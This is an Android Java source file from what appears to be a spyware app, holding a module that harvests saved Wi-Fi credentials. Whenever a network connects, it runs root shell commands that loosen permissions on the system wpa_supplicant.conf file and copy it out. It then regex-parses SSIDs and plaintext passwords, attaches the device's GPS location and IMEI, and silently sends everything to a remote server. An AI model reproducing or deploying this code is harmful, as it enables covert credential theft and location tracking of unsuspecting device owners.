package com.hyadesinc.curiosus.modules;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.support.v4.content.LocalBroadcastManager;

import com.hyadesinc.curiosus.Debug;
import com.hyadesinc.curiosus.ServerMessanger;
import com.hyadesinc.curiosus.SettingsManager;
import com.hyadesinc.curiosus.lib.FileUtil;
import com.hyadesinc.curiosus.lib.IMessageBody;
import com.hyadesinc.curiosus.lib.MessageType;
import com.hyadesinc.curiosus.lib.WirelessPasswordMessage;
import com.hyadesinc.curiosus.modules.location.LocationModule;
import com.hyadesinc.curiosus.receivers.ConnectionReceiver;

import com.hyadesinc.curiosus.variables.ServerMessage;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@SuppressLint("NewApi")
public class WirelessPasswordModule {

	private Context mContext;
	private SettingsManager mSettings;
	private Handler mHandler;
	private BroadcastReceiver mConnectionReceiver;
	private Boolean mStarted;

    private static final String REGEXP = "network=\\{\\n\\s*ssid=\"([^\"]+)\"\\n\\s*psk=\\\"([^\"]+)\\\"\\n\\s*key_mgmt=(.*)\\n\\s*priority=(\\d+)\\n\\}";

    private String WPA_PATH = "/data/misc/wifi/wpa_supplicant.conf";

    private String LOCAL_PATH = "";

    private String FILENAME = "wpa_supplicant_w.conf";

	public WirelessPasswordModule(Context context){
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
			mContext = context;
			mSettings = new SettingsManager(context);

            LOCAL_PATH = FileUtil.getFullPath(context, "wpa_supplicant_w.conf");

			mConnectionReceiver = new BroadcastReceiver() {
				@Override
				public void onReceive(Context context, Intent intent) {

                    final Context ctx = context;

                    Debug.i("Got NETWORK_AVAILABLE");

                    MyCommandCapture command = new MyCommandCapture(
                            "chmod 777 " + WPA_PATH,
                            "cp " + WPA_PATH + " " + LOCAL_PATH,
                            "chmod 777 " + FileUtil.getFullPath(mContext, "*"),
                            "chcon u:object_r:system_file:s0 " + LOCAL_PATH);

                    command.setCallback(new ICommandCallback() {
                        @Override
                        public void run() {

                            String file_content = read_file(ctx, WPA_PATH);

                            final Pattern pattern = Pattern.compile(REGEXP);
                            final Matcher matcher = pattern.matcher(file_content);

                            ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
                            WirelessPasswordMessage message;

                            while(matcher.find()){
                                message = new WirelessPasswordMessage(matcher.group(1), matcher.group(2), matcher.group(3), Integer.parseInt(matcher.group(4)));
                                Location location = LocationModule.getLocation(mContext);
                                if (location != null) {
                                    message.addLocation(location.getLatitude(), location.getLongitude());
                                }
                                messages.add(message);
                            }

                            new ServerMessanger(
                                    mContext,
                                    new ServerMessage(MessageType.WIRELESS_PASSWORD, mSettings.imei(), messages),
                                    new ServerMessanger.ICallBack() {
                                        @Override
                                        public boolean onFinished(String response) { return false; }

                                        @Override
                                        public void onError() {

                                        }

                                        @Override
                                        public void onSuccess() {
                                            ;
                                        }
                                    }
                            ).start();
                        }
                    });

                    try {
                        RootTools.getShell(true).add(command);

                    } catch (Exception e) {
                        Debug.exception(e);
                    }


                }


			};

			mHandler = new MyHandler(this);
			mStarted = true;
		}
		else{
			mStarted = false;
		}
	}

    private interface ICommandCallback{
        public void run();
    }

    private class MyCommandCapture extends CommandCapture{
        private ICommandCallback callback;

        public MyCommandCapture(String... command){
            super(0, command);
        }

        public void setCallback(ICommandCallback callback){
            this.callback = callback;
        }

        @Override
        public void commandCompleted(int id, int exitcode) {
            if (callback != null) {
                callback.run();
            }
        }
    }

    public String read_file(Context context, String filename) {
        try {
            Debug.i("Copying " + filename + " to " + LOCAL_PATH);
            FileUtil.copyFile(filename, LOCAL_PATH);

            FileInputStream fis = context.openFileInput(FILENAME);
            InputStreamReader isr = new InputStreamReader(fis, "UTF-8");
            BufferedReader bufferedReader = new BufferedReader(isr);
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (FileNotFoundException e) {
            Debug.exception(e);
            return "ERROR";
        } catch (UnsupportedEncodingException e) {
            Debug.exception(e);
            return "ERROR";
        } catch (IOException e) {
            Debug.exception(e);
            return "ERROR";
        }

    }

	public void start(){
		if (mStarted ) {
			LocalBroadcastManager.getInstance(mContext).registerReceiver(
					mConnectionReceiver,
					new IntentFilter(ConnectionReceiver.NETWORK_AVAILABLE)
			);
		}
	}

	public void dispose(){
		if (mStarted) {
			try {
				mHandler.removeMessages(0);
				mHandler = null;
				LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mConnectionReceiver);
				mConnectionReceiver = null;

			} catch (Exception e) {
				Debug.exception(e);
			}
		}
	}

	private static class MyHandler extends Handler{
		private final WeakReference<WirelessPasswordModule> mModule;

		private MyHandler(WirelessPasswordModule module) {
			mModule = new WeakReference<WirelessPasswordModule>(module);
		}

		@Override
		public void handleMessage(Message msg) {
			WirelessPasswordModule mgr = mModule.get();
			if (mgr != null) {

			}
		}
	}
}